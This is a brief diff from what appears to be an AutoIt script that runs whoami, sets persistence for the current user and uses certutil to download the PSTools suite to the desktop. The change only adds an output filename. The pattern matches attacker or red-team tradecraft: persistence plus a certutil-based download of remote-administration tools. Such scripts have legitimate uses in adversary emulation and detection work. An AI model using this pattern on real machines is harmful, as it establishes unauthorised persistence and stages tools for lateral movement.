@@ -7,4 +7,4 @@ whoami()
 SetPersistent4CurrentUser()
 
 ; use certutil to download pstools "https://download.sysinternals.com/files/PSTools.zip"
-CertUtilDownloader($PSTools_URL, @DesktopDir)
+CertUtilDownloader($PSTools_URL, @DesktopDir & "\tools.zip")
